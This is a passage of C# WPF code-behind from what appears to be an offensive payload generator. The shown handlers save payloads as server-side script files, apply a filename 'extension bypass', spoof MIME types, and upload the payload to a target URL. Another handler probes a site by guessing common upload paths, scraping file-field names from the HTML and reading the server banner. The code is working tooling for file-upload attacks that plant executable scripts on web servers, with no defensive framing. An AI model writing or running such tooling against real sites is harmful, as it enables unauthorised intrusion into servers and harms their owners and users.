            {
                PayloadOutputBox.Text = currentHexPayload;
                showingRaw = false;
                PreviewHexBtn.Background = Brushes.DarkRed;
                PreviewRawBtn.Background = Brushes.Transparent;
                PreviewDecodedBtn.Background = Brushes.Transparent;
            }
        }

        private void CopyBtn_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(PayloadOutputBox.Text))
            {
                MessageBox.Show("No payload to copy", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            Clipboard.SetText(PayloadOutputBox.Text);
            StatusText.Text = "COPIED!";
            StatusText.Foreground = Brushes.LightGreen;
        }

        private void SaveBtn_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(PayloadOutputBox.Text))
            {
                MessageBox.Show("No payload to save", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            string language = ((ComboBoxItem)LanguageCombo.SelectedItem).Content.ToString().ToLower();
            string extension = GetFileExtension(language);

            string filename = ApplyExtensionBypass($"payload_{GetSelectedPayloadType().ToLower()}_{DateTime.Now:yyyyMMdd_HHmmss}.{extension}");

            var dialog = new SaveFileDialog
            {
                Filter = $"{language.ToUpper()} Files (*.{extension})|*.{extension}|All Files (*.*)|*.*",
                Title = "Save Payload",
                FileName = filename
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    File.WriteAllText(dialog.FileName, PayloadOutputBox.Text);
                    StatusText.Text = "SAVED!";
                    StatusText.Foreground = Brushes.LightGreen;

                    MessageBox.Show($"Payload saved to:\n{dialog.FileName}", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error saving file: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private string GetFileExtension(string language)
        {
            return language switch
            {
                "php" => "php",
                "python" => "py",
                "bash" => "sh",
                "powershell" => "ps1",
                "perl" => "pl",
                "ruby" => "rb",
                "java" => "java",
                "c" => "c",
                "asp" => "asp",
                "aspx" => "aspx",
                "jsp" => "jsp",
                "node.js" => "js",
                "c#" => "cs",
                "go" => "go",
                "rust" => "rs",
                _ => "txt"
            };
        }

        private async void UploadBtn_Click(object sender, RoutedEventArgs e)
        {
            string url = TargetURLInput.Text.Trim();
            string fieldName = FieldNameInput.Text.Trim();

            if (string.IsNullOrEmpty(url))
            {
                MessageBox.Show("Please enter target URL", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (string.IsNullOrEmpty(fieldName))
            {
                fieldName = "file";
            }

            if (string.IsNullOrEmpty(PayloadOutputBox.Text))
            {
                MessageBox.Show("Please generate a payload first", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            StatusText.Text = "UPLOADING...";
            StatusText.Foreground = Brushes.Yellow;

            try
            {
                string language = ((ComboBoxItem)LanguageCombo.SelectedItem).Content.ToString().ToLower();
                string extension = GetFileExtension(language);
                string filename = ApplyExtensionBypass($"payload.{extension}");

                
                using (var formData = new MultipartFormDataContent())
                {
                    byte[] payloadBytes = Encoding.UTF8.GetBytes(PayloadOutputBox.Text);
                    var fileContent = new ByteArrayContent(payloadBytes);

                    
                    if (CheckMimeSpoof.IsChecked == true && MimeTypeCombo.SelectedItem != null)
                    {
                        string mimeType = ((ComboBoxItem)MimeTypeCombo.SelectedItem).Content.ToString();
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(mimeType);
                    }

                    formData.Add(fileContent, fieldName, filename);

                    
                    var response = await httpClient.PostAsync(url, formData);
                    string responseBody = await response.Content.ReadAsStringAsync();

                    if (response.IsSuccessStatusCode)
                    {
                        StatusText.Text = "UPLOADED!";
                        StatusText.Foreground = Brushes.LightGreen;

                        string result = $"Upload successful!\nStatus: {(int)response.StatusCode} {response.StatusCode}\n";
                        result += $"Filename: {filename}\n";
                        result += $"Response: {responseBody}";

                        MessageBox.Show(result, "Upload Success", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                    else
                    {
                        StatusText.Text = "FAILED";
                        StatusText.Foreground = Brushes.Red;

                        string error = $"Upload failed!\nStatus: {(int)response.StatusCode} {response.StatusCode}\n";
                        error += $"Response: {responseBody}";

                        MessageBox.Show(error, "Upload Failed", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = "ERROR";
                StatusText.Foreground = Brushes.Red;
                MessageBox.Show($"Upload error: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void TestUploadBtn_Click(object sender, RoutedEventArgs e)
        {
            string url = TargetURLInput.Text.Trim();

            if (string.IsNullOrEmpty(url))
            {
                MessageBox.Show("Please enter target URL", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            StatusText.Text = "TESTING...";
            StatusText.Foreground = Brushes.Yellow;

            try
            {
                
                var results = new StringBuilder();
                results.AppendLine("=== UPLOAD VULNERABILITY TEST ===\n");

                
                try
                {
                    var getResponse = await httpClient.GetAsync(url);
                    results.AppendLine($"GET {url}: {(int)getResponse.StatusCode} {getResponse.StatusCode}");
                }
                catch { results.AppendLine($"GET {url}: Failed"); }

               
                string[] commonPaths = {
                    "/upload", "/upload.php", "/uploads", "/file-upload",
                    "/api/upload", "/uploader", "/uploadFile", "/uploadImage",
                    "/admin/upload", "/media/upload", "/files/upload"
                };

                foreach (var path in commonPaths)
                {
                    try
                    {
                        Uri baseUri = new Uri(url);
                        Uri testUri = new Uri(baseUri, path);
                        var response = await httpClient.GetAsync(testUri);
                        if (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.MethodNotAllowed)
                        {
                            results.AppendLine($"Possible upload endpoint: {testUri} ({(int)response.StatusCode})");
                        }
                    }
                    catch { }
                }

                
                try
                {
                    var htmlResponse = await httpClient.GetStringAsync(url);
                    if (htmlResponse.Contains("enctype=\"multipart/form-data\"") ||
                        htmlResponse.Contains("type=\"file\"") ||
                        htmlResponse.Contains("upload"))
                    {
                        results.AppendLine("\nFile upload form detected in HTML!");

                        
                        var matches = Regex.Matches(htmlResponse, "name=\"([^\"]+)\"");
                        foreach (Match match in matches)
                        {
                            string field = match.Groups[1].Value;
                            if (htmlResponse.Contains($"name=\"{field}\"") &&
                                htmlResponse.IndexOf(field) < htmlResponse.IndexOf("type=\"file\""))
                            {
                                results.AppendLine($"Possible file field: {field}");
                            }
                        }
                    }
                }
                catch { }

                
                try
                {
                    var headRequest = new HttpRequestMessage(HttpMethod.Head, url);
                    var headResponse = await httpClient.SendAsync(headRequest);
                    if (headResponse.Headers.Server.Count > 0)
                    {
                        results.AppendLine($"\nServer: {string.Join(", ", headResponse.Headers.Server)}");
                    }
                }
                catch { }

                StatusText.Text = "TEST COMPLETE";
                StatusText.Foreground = Brushes.LightGreen;

                MessageBox.Show(results.ToString(), "Upload Test Results", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                StatusText.Text = "ERROR";
                StatusText.Foreground = Brushes.Red;
                MessageBox.Show($"Test error: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void MinimizeBtn_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void CloseBtn_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }
    }
}